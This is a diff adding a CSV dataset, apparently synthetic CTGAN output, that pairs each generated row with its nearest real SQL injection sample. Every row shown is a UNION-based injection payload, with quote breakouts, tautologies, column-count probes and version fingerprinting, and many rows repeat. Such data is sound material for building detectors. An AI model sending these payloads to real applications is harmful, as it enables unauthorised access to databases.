@@ -1,0 +1,501 @@
+id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
+CTGAN_000001,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000199,6.140234155914208
+CTGAN_000002,attack,union,"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000756,4.854704637238744
+CTGAN_000003,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000228,5.530757331914847
+CTGAN_000004,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000697,5.357151418681441
+CTGAN_000005,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,5.217349439087199
+CTGAN_000006,attack,union,"-1287""  )   as bbzg where 1475  =  1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",nearest_attack_euclidean,R000513,6.29726606599255
+CTGAN_000007,attack,union,"1""  )   as drrx where 8633  =  8633 union all select null,null,null--",nearest_attack_euclidean,R000418,4.966707086044974
+CTGAN_000008,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000261,5.912619580841264
+CTGAN_000009,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,5.189218975984117
+CTGAN_000010,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000319,6.867367993418055
+CTGAN_000011,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000504,5.82738103793913
+CTGAN_000012,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000281,4.494054822309441
+CTGAN_000013,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,4.272634917769981
+CTGAN_000014,attack,union,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",nearest_attack_euclidean,R000252,4.066665724811695
+CTGAN_000015,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.498742981607147
+CTGAN_000016,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,6.5189429894848905
+CTGAN_000017,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000697,5.677413830556622
+CTGAN_000018,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,6.355408300837553
+CTGAN_000019,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R000289,6.2857438057732
+CTGAN_000020,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000475,5.730611626006474
+CTGAN_000021,attack,union,"1""  )   as upyn where 6185  =  6185 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000414,5.854473575292772
+CTGAN_000022,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,4.861389586268736
+CTGAN_000023,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000680,4.773980718654389
+CTGAN_000024,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,6.201638244933973
+CTGAN_000025,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000394,6.402963742011825
+CTGAN_000026,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R000738,5.721868900715162
+CTGAN_000027,attack,union,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",nearest_attack_euclidean,R000602,4.8954870588381425
+CTGAN_000028,attack,union,"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",nearest_attack_euclidean,R000601,5.958557339939292
+CTGAN_000029,attack,union,"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",nearest_attack_euclidean,R000395,6.214749260265559
+CTGAN_000030,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,5.7576234902636765
+CTGAN_000031,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000595,4.828000595005532
+CTGAN_000032,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000629,5.215227441181899
+CTGAN_000033,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,6.517821554048684
+CTGAN_000034,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000394,5.62984755977735
+CTGAN_000035,attack,union,"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",nearest_attack_euclidean,R000772,5.020996122485616
+CTGAN_000036,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,5.529268706311898
+CTGAN_000037,attack,union,"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",nearest_attack_euclidean,R000322,5.214820628764836
+CTGAN_000038,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,5.329198366537289
+CTGAN_000039,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,5.201437737424631
+CTGAN_000040,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,4.5428597044336385
+CTGAN_000041,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000595,4.656998906330832
+CTGAN_000042,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,5.301287665072724
+CTGAN_000043,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,5.738580969003891
+CTGAN_000044,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000554,4.9124035717647345
+CTGAN_000045,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.365233600241091
+CTGAN_000046,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,4.173412781313392
+CTGAN_000047,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,5.085246346746048
+CTGAN_000048,attack,union,"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",nearest_attack_euclidean,R000478,6.590393334343235
+CTGAN_000049,attack,union,"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000667,4.105517568327381
+CTGAN_000050,attack,union,"1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000217,5.20698045616677
+CTGAN_000051,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,4.064193560754533
+CTGAN_000052,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000018,6.435446138502308
+CTGAN_000053,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,4.448750681979419
+CTGAN_000054,attack,union,1'||  (  select 'owzs' where 1475  =  1475 union all select null--,nearest_attack_euclidean,R000724,6.36401488067898
+CTGAN_000055,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,4.8532406519574804
+CTGAN_000056,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000355,6.916420049392855
+CTGAN_000057,attack,union,"-5360' where 8178  =  8178 union all select 8178,8178,8178--",nearest_attack_euclidean,R000616,6.563958644331003
+CTGAN_000058,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,6.049730126479445
+CTGAN_000059,attack,union,"1""  )   as upyn where 6185  =  6185 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000414,6.362059123391744
+CTGAN_000060,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,5.79887050263095
+CTGAN_000061,attack,union,"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",nearest_attack_euclidean,R000490,5.105779948118455
+CTGAN_000062,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000172,4.8796596047949805
+CTGAN_000063,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,5.449295985275629
+CTGAN_000064,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.995069432936855
+CTGAN_000065,attack,union,"-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--",nearest_attack_euclidean,R000325,5.638297750910809
+CTGAN_000066,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,5.184907954257166
+CTGAN_000067,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000475,4.892457694675497
+CTGAN_000068,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,7.215769725182584
+CTGAN_000069,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,6.145112410943348
+CTGAN_000070,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000144,7.919164280242302
+CTGAN_000071,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000677,6.021484125407468
+CTGAN_000072,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000220,6.072429722705708
+CTGAN_000073,attack,union,"-5275%'   )    )    union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",nearest_attack_euclidean,R000686,5.480204099141063
+CTGAN_000074,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R000212,4.211157227655343
+CTGAN_000075,attack,union,"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#",nearest_attack_euclidean,R000741,6.193961071159521
+CTGAN_000076,attack,union,"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",nearest_attack_euclidean,R000490,6.730099223729875
+CTGAN_000077,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,4.8872830050916845
+CTGAN_000078,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000474,4.874293590515259
+CTGAN_000079,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000413,6.196839476994595
+CTGAN_000080,attack,union,"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",nearest_attack_euclidean,R000772,5.898125582892302
+CTGAN_000081,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.7699516089147185
+CTGAN_000082,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000281,4.873759632633038
+CTGAN_000083,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000549,5.834740048669524
+CTGAN_000084,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000697,5.891057917956004
+CTGAN_000085,attack,union,"1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000217,6.768790819439919
+CTGAN_000086,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000298,4.740839808032603
+CTGAN_000087,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,3.9331383394945694
+CTGAN_000088,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,5.159653565554983
+CTGAN_000089,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000190,5.3424558563780264
+CTGAN_000090,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000495,5.871750602268795
+CTGAN_000091,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000222,6.1669434671767185
+CTGAN_000092,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000359,4.894542491266899
+CTGAN_000093,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.654588306084241
+CTGAN_000094,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R000675,6.832728682143749
+CTGAN_000095,attack,union,"-7635"" union all select 1284,1284,1284,1284,1284,1284#",nearest_attack_euclidean,R000196,7.531256753684769
+CTGAN_000096,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000504,5.517105138967437
+CTGAN_000097,attack,union,"-8098%'  )   union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",nearest_attack_euclidean,R000238,5.514231614582828
+CTGAN_000098,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,6.2417462848084355
+CTGAN_000099,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,5.174726871202128
+CTGAN_000100,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000183,6.671103263155098
+CTGAN_000101,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,4.805063238471867
+CTGAN_000102,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,6.914746813546237
+CTGAN_000103,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,6.39615119088937
+CTGAN_000104,attack,union," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000106,6.719929559325287
+CTGAN_000105,attack,union,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000350,4.928208962718101
+CTGAN_000106,attack,union," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000036,6.404292588412912
+CTGAN_000107,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000680,6.327243446176404
+CTGAN_000108,attack,union,"1'||  (  select 'zdfo' from dual where 4288  =  4288 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000747,6.86426104972099
+CTGAN_000109,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.584187405268927
+CTGAN_000110,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,5.9976014639000335
+CTGAN_000111,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000294,7.332048589798816
+CTGAN_000112,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000421,5.7014440563009
+CTGAN_000113,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,5.42929773952022
+CTGAN_000114,attack,union,1'||  (  select 'owzs' where 1475  =  1475 union all select null--,nearest_attack_euclidean,R000724,5.288564847603479
+CTGAN_000115,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,4.932133445162419
+CTGAN_000116,attack,union,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",nearest_attack_euclidean,R000251,6.480388377795194
+CTGAN_000117,attack,union,"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",nearest_attack_euclidean,R000324,5.2225947568471724
+CTGAN_000118,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,4.291439307092684
+CTGAN_000119,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R000635,4.283108305841332
+CTGAN_000120,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000423,5.159979419250968
+CTGAN_000121,attack,union,"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",nearest_attack_euclidean,R000714,5.376033437175874
+CTGAN_000122,attack,union,"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000642,5.7439097221778015
+CTGAN_000123,attack,union,"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",nearest_attack_euclidean,R000260,5.014530812903509
+CTGAN_000124,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,6.180645773392473
+CTGAN_000125,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R000289,3.7882902825906446
+CTGAN_000126,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000514,7.368487114698798
+CTGAN_000127,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,5.703301945708912
+CTGAN_000128,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,5.467486430201822
+CTGAN_000129,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.367003668979644
+CTGAN_000130,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000554,5.898661130436375
+CTGAN_000131,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,5.0317589262305695
+CTGAN_000132,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,4.818385417765614
+CTGAN_000133,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000504,4.636857219937888
+CTGAN_000134,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,6.508936906158786
+CTGAN_000135,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,4.432896750521221
+CTGAN_000136,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000219,5.738522200982669
+CTGAN_000137,attack,union,"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#",nearest_attack_euclidean,R000272,5.031660377516043
+CTGAN_000138,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R000212,5.971787961341538
+CTGAN_000139,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000470,5.555189045866309
+CTGAN_000140,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000319,7.0795779447236455
+CTGAN_000141,attack,union,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",nearest_attack_euclidean,R000573,6.006808024493293
+CTGAN_000142,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000474,4.744880949389356
+CTGAN_000143,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,5.167171608152128
+CTGAN_000144,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000265,6.41601666317904
+CTGAN_000145,attack,union,"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",nearest_attack_euclidean,R000714,5.24716987394015
+CTGAN_000146,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000413,6.414359388872615
+CTGAN_000147,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,5.744103421273246
+CTGAN_000148,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000198,5.838767752135635
+CTGAN_000149,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000211,4.736893742993715
+CTGAN_000150,attack,union,"-6360'  )   as yfrk where 3683  =  3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",nearest_attack_euclidean,R000443,3.9299565328570742
+CTGAN_000151,attack,union,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",nearest_attack_euclidean,R000699,4.603357530392429
+CTGAN_000152,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,4.909361119739504
+CTGAN_000153,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000177,6.681157264519815
+CTGAN_000154,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000394,5.721242426543769
+CTGAN_000155,attack,union,"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",nearest_attack_euclidean,R000440,5.1529808492946865
+CTGAN_000156,attack,union,"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",nearest_attack_euclidean,R000497,6.027819648714622
+CTGAN_000157,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,5.966928565436909
+CTGAN_000158,attack,union,"-8093""   )    )    as oboi where 1476  =  1476 union all select 1476,1476,1476,1476#",nearest_attack_euclidean,R000333,5.611502557008195
+CTGAN_000159,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,4.138880974488701
+CTGAN_000160,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.390468092336184
+CTGAN_000161,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,4.679976299774983
+CTGAN_000162,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000352,5.699476997261513
+CTGAN_000163,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,5.697701857590953
+CTGAN_000164,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000144,5.73652293519362
+CTGAN_000165,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000183,7.2078717892940185
+CTGAN_000166,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,6.576810563333294
+CTGAN_000167,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,5.694073040822138
+CTGAN_000168,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,6.576968090274514
+CTGAN_000169,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.713951684514895
+CTGAN_000170,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000576,7.1019049000895205
+CTGAN_000171,attack,union,"-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",nearest_attack_euclidean,R000309,4.315390877697619
+CTGAN_000172,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,4.540829458061894
+CTGAN_000173,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000571,5.790403607952705
+CTGAN_000174,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000246,5.309006545622029
+CTGAN_000175,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000421,4.720061355385807
+CTGAN_000176,attack,union,"-5360' where 8178  =  8178 union all select 8178,8178,8178--",nearest_attack_euclidean,R000616,5.66366914485665
+CTGAN_000177,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,5.654551420168579
+CTGAN_000178,attack,union,"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",nearest_attack_euclidean,R000749,5.722387736724318
+CTGAN_000179,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000549,5.116839026761465
+CTGAN_000180,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000177,5.675912279208
+CTGAN_000181,attack,union,"1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000317,5.43874482067413
+CTGAN_000182,attack,union,"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",nearest_attack_euclidean,R000468,4.514771916496687
+CTGAN_000183,attack,union,"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",nearest_attack_euclidean,R000771,4.250982319021557
+CTGAN_000184,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000413,5.676917221809512
+CTGAN_000185,attack,union,"-5738""  )   as efbn where 8541  =  8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",nearest_attack_euclidean,R000687,4.848816296129951
+CTGAN_000186,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000014,4.166162489782093
+CTGAN_000187,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000495,4.116134511472758
+CTGAN_000188,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000423,5.031955727557582
+CTGAN_000189,attack,union," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000088,7.255573731901522
+CTGAN_000190,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.660308841408743
